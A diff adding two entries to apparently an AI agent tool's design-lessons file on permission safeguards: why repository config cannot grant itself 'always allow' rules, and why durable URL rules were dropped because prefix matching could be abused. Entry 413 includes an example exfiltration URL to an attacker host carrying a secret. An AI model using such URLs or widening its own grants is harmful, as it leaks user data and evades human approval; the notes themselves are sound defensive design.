@@ -4534,6 +4534,49 @@ and whatever is waiting on it — alive forever.
 - **Precedent:** the provider stream already had exactly this shape, with an
   idle timeout for a stalled stream and a total timeout independent of progress.
 
+## 412. A grant is only durable if the layer you write it to is one the reader trusts
+
+Persistence has two halves and it is easy to ship only the first. The write
+succeeds, the UI says "saved", the file on disk contains exactly the right rule
+— and the loader drops it every time, because the layer it landed in is one the
+trust boundary deliberately downgrades. The user then has a permission they
+believe they granted, cannot see failing, and will re-grant every session.
+
+- **Do:** before persisting anything the policy will later read, check what the
+  READER does to that layer. If the loader sanitizes it, writing there is not a
+  weaker version of persistence — it is a lie with a file behind it.
+- **Caught:** while adding "always allow" to the permission prompt. The obvious
+  home for a project-specific approval is `.seekforge/config.json`, and
+  `sanitizeProjectConfig` strips every `allow` rule from a repository layer —
+  by design, since a repo must not grant itself permissions. The durable rule
+  goes to `~/.seekforge/config.json` for that reason, and only there.
+- **Related:** the same question applies in reverse to what you OFFER. Core
+  omits `rememberRule` from the prompt whenever it will not grant the call
+  durably, so a frontend cannot present a choice and then have to invent the
+  rule behind it.
+
+## 413. A rule a keystroke can create must be matched by the strictest matcher available
+
+A matcher can be deliberately lenient because of who writes its input. URL allow
+rules match by unanchored prefix so that one hand-typed docs-domain rule covers
+its sub-paths — a good default for a line a person chose to write. Generate that
+same rule from one value the model happened to pass, and the leniency is no
+longer a convenience: the grant now covers every string that starts the same
+way, in every project, forever.
+
+- **Do:** when adding a one-keystroke way to create a policy entry, check the
+  matcher each candidate subject gets — not the matcher in general. Offer only
+  the subjects whose matching is anchored, and say why the others are missing.
+- **Caught:** in review of `proposeDurableRule`. `web_fetch` classifies as
+  `GET <url>`, so the first version offered a durable rule for it; `ruleMatches`
+  compares non-shell commands with a bare `startsWith`, which would have made an
+  approved `GET https://host/doc.md` also cover
+  `https://host/doc.md.attacker.example/leak?secret=…`. Durable rules are now
+  restricted to `run_command`/`task_kill`, whose matching is anchored on a
+  token boundary.
+- **Related:** [412] — that entry is about writing to a layer the reader
+  discards; this one is about writing a rule the matcher reads too generously.
+
 ---
 
 *Add an entry whenever a boundary defect is fixed: the pattern, the fix, and the
